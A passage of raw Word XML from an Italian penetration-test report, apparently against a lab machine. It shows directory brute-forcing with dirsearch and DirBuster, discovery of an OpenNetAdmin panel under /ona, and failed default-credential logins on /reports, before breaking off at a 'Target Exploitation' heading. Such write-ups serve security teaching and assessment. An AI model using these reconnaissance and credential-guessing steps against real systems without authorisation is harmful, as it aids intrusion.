&#10;WsyhubWEyJg20okkRv+gT6JC2zzTOq1iVjKBEZS7B3lQbkO/O7SQQq5WyY2I7CDcm60TMXiELkL7&#10;1D0DumH2gVjzYE98hsU7CvS+PQlWh2BVnfhxxpV4FRVagsSwYWHjlr3Vk9f5t7L8BQAA//8DAFBL&#10;AwQUAAYACAAAACEAfdoVFd0AAAAIAQAADwAAAGRycy9kb3ducmV2LnhtbEyPwU7DMBBE70j8g7VI&#10;3KhD3FYlxKkQEhKHIkHbD3DjbRIRr6N426Z/z3KC486MZt+U6yn06oxj6iJZeJxloJDq6DtqLOx3&#10;bw8rUIkdeddHQgtXTLCubm9KV/h4oS88b7lRUkKpcBZa5qHQOtUtBpdmcUAS7xjH4FjOsdF+dBcp&#10;D73Os2ypg+tIPrRuwNcW6+/tKVgIm/pp5PfG7D/N6rrpdqyP4cPa+7vp5RkU48R/YfjFF3SohOkQ&#10;T+ST6i3IELawyI0BJfZ8sRTlIMrc5KCrUv8fUP0AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEAvTIx4VECAACeBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEAfdoVFd0AAAAIAQAADwAAAAAAAAAAAAAAAACrBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="22315E63" w14:textId="77777777" w:rsidR="008D2168" w:rsidRDefault="008D2168" w:rsidP="008D2168">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="005E1E61" w:rsidRPr="005E1E61">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13966571" wp14:editId="344E2167">
            <wp:extent cx="5274310" cy="3994785"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5715"/>
            <wp:docPr id="14669214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21470" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3994785"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00D02E6F" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 1</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D02E6F" w:rsidRPr="00B01334">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>dirsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3C86BFC4" w14:textId="79966CBF" w:rsidR="00352443" w:rsidRDefault="008A7F8A" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Possimo notare</w:t>
      </w:r>
      <w:r w:rsidR="00D074E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> la directory dell’output e il file per il log degli errori .V</w:t>
      </w:r>
      <w:r w:rsidR="008A7B80">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>engono riscontarti</w:t>
      </w:r>
      <w:r w:rsidR="00D074E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> inoltre,</w:t>
      </w:r>
      <w:r w:rsidR="008A7B80">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EC4992">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>alcuni</w:t>
      </w:r>
      <w:r w:rsidR="008A7B80">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> file nascosti </w:t>
      </w:r>
      <w:r w:rsidR="00287683">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">(contrassegnati con il codice 403), </w:t>
      </w:r>
      <w:r w:rsidR="008200C7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">con le varie estensioni </w:t>
      </w:r>
      <w:r w:rsidR="008A7B80">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>e la director</w:t>
      </w:r>
      <w:r w:rsidR="008200C7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r w:rsidR="008A7B80">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> /ona</w:t>
      </w:r>
      <w:r w:rsidR="008200C7">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41004B48" w14:textId="77777777" w:rsidR="00352443" w:rsidRDefault="00352443" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="204879DE" w14:textId="7BDD353A" w:rsidR="005D7D15" w:rsidRDefault="008200C7" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Un altro tool che analizziamo è </w:t>
      </w:r>
      <w:r w:rsidR="00992EC6" w:rsidRPr="00992EC6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00992EC6" w:rsidRPr="00992EC6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>DirBuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E4A02">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> Come mostrato nella Figura </w:t>
      </w:r>
      <w:r w:rsidR="00287683">
        <w:t>andiamo</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> a settare URL target e il percorso della </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E4A02">
        <w:t>wordlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> da utilizzare per l’attacco. Nel nostro caso abbiamo utilizzato la </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002E4A02">
        <w:t>wordlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002E4A02" w:rsidRPr="002E4A02">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>directory-list-lowercase-2.3-small</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.txt.</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> Il tool crea in output dei report con le informazioni rilevate, nel nostro </w:t>
      </w:r>
      <w:r w:rsidR="00287683">
        <w:t>caso</w:t>
      </w:r>
      <w:r w:rsidR="00287683" w:rsidRPr="00287683">
        <w:t xml:space="preserve"> riguardano</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:t xml:space="preserve"> la </w:t>
      </w:r>
      <w:r w:rsidR="002E4A02" w:rsidRPr="002E4A02">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>directory /reports/</w:t>
      </w:r>
      <w:r w:rsidR="002E4A02">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A7743D" w14:textId="3D3F136C" w:rsidR="002E4A02" w:rsidRPr="002E4A02" w:rsidRDefault="002E4A02" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FC7EB2C" w14:textId="2C15FCE1" w:rsidR="005D7D15" w:rsidRDefault="002E4A02" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0431D892" wp14:editId="6C6A364C">
            <wp:extent cx="5274310" cy="3438525"/>
            <wp:effectExtent l="0" t="0" r="2540" b="9525"/>
            <wp:docPr id="845589873" name="Immagine 4"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9873" name="Immagine 4" descr="Immagine che contiene testo, schermata, software, schermo&#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438525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="619E011B" w14:textId="77777777" w:rsidR="002E4A02" w:rsidRDefault="002E4A02" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B0FDE8C" w14:textId="404A9F7B" w:rsidR="005D7D15" w:rsidRPr="009530C8" w:rsidRDefault="002E4A02" w:rsidP="00287683">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="002E4A02">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="385EF204" wp14:editId="1EBE8261">
            <wp:extent cx="5274310" cy="3850640"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="2112201630"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1630" name="Immagine 1" descr="Immagine che contiene testo, schermata, software, schermo&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId41"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3850640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00287683" w:rsidRPr="009530C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 16: Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00287683" w:rsidRPr="009530C8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>DirBuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7F0972F6" w14:textId="77777777" w:rsidR="005D7D15" w:rsidRPr="009530C8" w:rsidRDefault="005D7D15" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B98A035" w14:textId="77777777" w:rsidR="005D7D15" w:rsidRPr="009530C8" w:rsidRDefault="005D7D15" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C6D0DC2" w14:textId="5C8C4B03" w:rsidR="00287683" w:rsidRPr="00EC4992" w:rsidRDefault="00EC4992" w:rsidP="000B7D0D">
      <w:r w:rsidRPr="00EC4992">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Dall’output posassimo notare anche </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">qui dei file nascosti </w:t>
      </w:r>
      <w:r w:rsidR="003F2E50">
        <w:t>e file a cui non siamo autorizzati.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E4D5E6" w14:textId="512E6019" w:rsidR="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="005D7D15">
      <w:r>
        <w:t xml:space="preserve">Dalle informazioni ricevute dalla fase precedente sappiamo che nell’indirizzo abbiamo una directory </w:t>
      </w:r>
      <w:r w:rsidRPr="00D76587">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/ona</w:t>
      </w:r>
      <w:r w:rsidR="003F2E50">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003F2E50">
        <w:t>che, ci può interessare</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Proviamo a inserirla all’interno della richiesta.</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2EDD">
        <w:t xml:space="preserve"> Se l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2EDD">
        <w:t xml:space="preserve"> visitiamo, abbiamo accesso a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FD2EDD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>opennetadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FD2EDD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD2EDD">
        <w:t xml:space="preserve"> con login ospite.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0E83D8" w14:textId="77777777" w:rsidR="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59A2EE40" w14:textId="1F7020C1" w:rsidR="005D7D15" w:rsidRPr="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="005D7D15">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1436731A" wp14:editId="07EA682B">
            <wp:extent cx="5273498" cy="2000816"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="1486404713" name="Immagine 1" descr="Immagine che contiene testo, software, Icona del computer,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04713" name="Immagine 1" descr="Immagine che contiene testo, software, Icona del computer, schermata&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId42"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5298444" cy="2010281"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="003F2E50">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: Pagina web sull’indirizzo 10.0.2.4/ona/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B98D53" w14:textId="5A9B04E9" w:rsidR="005D7D15" w:rsidRDefault="005D7D15" w:rsidP="005D7D15">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5667"/>
        </w:tabs>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A912B47" w14:textId="6A1F1935" w:rsidR="00791A49" w:rsidRPr="00791A49" w:rsidRDefault="00791A49" w:rsidP="005C6C82">
      <w:r>
        <w:t xml:space="preserve">Proviamo anche ad accedere alla directory </w:t>
      </w:r>
      <w:r w:rsidRPr="00791A49">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/reports/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ma, come già sapevamo, ci troviamo in un’area ristretta e quindi</w:t>
      </w:r>
      <w:r w:rsidR="005C6C82">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ci viene chiesto di effettuare il login. Sono state effettuate delle prove di accesso base con le credenziali standard, come, user – user e admin - admin. Ma non si</w:t>
      </w:r>
      <w:r w:rsidR="005C6C82">
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>mo in grado di effettuare il login con le credenziali giuste.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADDC17D" w14:textId="77777777" w:rsidR="00791A49" w:rsidRDefault="00791A49" w:rsidP="005D7D15">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5667"/>
        </w:tabs>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61C9FA27" w14:textId="1C8E98B1" w:rsidR="00791A49" w:rsidRDefault="00791A49" w:rsidP="00791A49">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5667"/>
        </w:tabs>
      </w:pPr>
      <w:r w:rsidRPr="00791A49">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="486B5B5B" wp14:editId="48CC2CB7">
            <wp:extent cx="5274310" cy="2465070"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="358892834"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92834" name="Immagine 1" descr="Immagine che contiene schermata, testo, software, Software multimediale&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId43"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="2465070"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3003D79B" w14:textId="012D4CE2" w:rsidR="00791A49" w:rsidRPr="005D7D15" w:rsidRDefault="00791A49" w:rsidP="00791A49">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>18</w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>: Pagina web sull’indirizzo 10.0.2.4/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>reports</w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6497D644" w14:textId="77777777" w:rsidR="00791A49" w:rsidRDefault="00791A49" w:rsidP="00791A49">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5667"/>
        </w:tabs>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A4E9FF8" w14:textId="77777777" w:rsidR="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="00791A49">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="5667"/>
        </w:tabs>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21411EA7" w14:textId="62874E78" w:rsidR="005C6C82" w:rsidRPr="009530C8" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc139378619"/>
      <w:r w:rsidRPr="009530C8">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>8 Target Exploitation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="0B295D21" w14:textId="77777777" w:rsidR="005C6C82" w:rsidRPr="009530C8" w:rsidRDefault="005C6C82" w:rsidP="005C6C82"/>
    <w:p w14:paraId="1067EEFF" w14:textId="19590BFE" w:rsidR="005C6C82" w:rsidRPr="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">La fase di </w:t>
      </w:r>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Target Exploitation</w:t>
      </w:r>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> cerca di «sfruttare» le vulnerabilità rilevate e di trarne vantaggio.</w:t>
      </w:r>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Gli obiettivi principali del Target Exploitation sono ottenere:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FBC3F1" w14:textId="77777777" w:rsidR="005C6C82" w:rsidRPr="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Pieno controllo di quante più macchine target possibili all’interno dell’asset analizzato. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45ADCB54" w14:textId="77777777" w:rsidR="005C6C82" w:rsidRPr="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Ulteriori informazioni e visibilità dell’asset e dei sistemi in esso contenuti</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D99337D" w14:textId="77777777" w:rsidR="005C6C82" w:rsidRPr="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50049143" w14:textId="60EA750C" w:rsidR="005C6C82" w:rsidRDefault="005C6C82" w:rsidP="005C6C82">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Il Target Exploitation è la fase in cui si oltrepassa il confine tra il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C6C82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
